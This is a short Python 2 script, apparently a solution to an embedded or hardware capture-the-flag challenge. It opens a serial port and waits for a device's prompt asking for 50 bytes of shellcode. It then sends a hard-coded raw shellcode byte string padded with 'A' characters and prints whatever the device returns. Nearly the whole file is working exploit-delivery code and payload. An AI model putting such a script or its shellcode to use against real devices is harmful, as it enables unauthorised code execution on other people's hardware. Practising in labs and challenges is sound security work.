
# need python2 + pyserial
import time
import serial

def readUntil(keywords, debug=False):
    '''Read until we find one of the keywords, 
    Then we print what we got, stop reading, and return the message
    
    keywords is a list of words: [ 'Password' ]
    '''
    out = ''
    while True:
        c = ser.read(1)
        out = out + c
        if debug:
            print c
        for keyword in keywords:
            if keyword in out:
                print out
                print '[+] Located %s ' % (keyword)
                return out, keyword
        if ser.inWaiting() <= 0:
            print '[-] Sleeping 1 sec'
            time.sleep(1)

def writeNotTooQuick(message, timeout=0.2, debug=False):
    for i in range(0, len(message)):
        ser.write(message[i])
        if debug:
            print "[+] writing: %s" % (message[i])
        time.sleep(timeout)

    
# ------------------------------------- MAIN -----------------------------
ser = serial.Serial(
    port='COM47',
    baudrate=115200,
    timeout=3 # wait up to 3 seconds to read info
)

ser.isOpen()

print "[+] We're in."
print '[+] Reading welvome message'
readUntil(keywords=['Send your shellcode, 50 bytes:'])
    
print "[+] Sending shellcode, 50 bytes (mandatory)"
writeNotTooQuick("\x37\x04\x00\x20\x81\x44\x37\x19\x00\x08\x13\x09\xE9\x0E\x03\x45\x04\x00\x02\x99\x05\x04\xE5\xBF" + 'A' * 26 )    # 50 bytes

for i in range(0, 20):
	print ser.read(10)

print '[+] Bye'
ser.close()
exit()
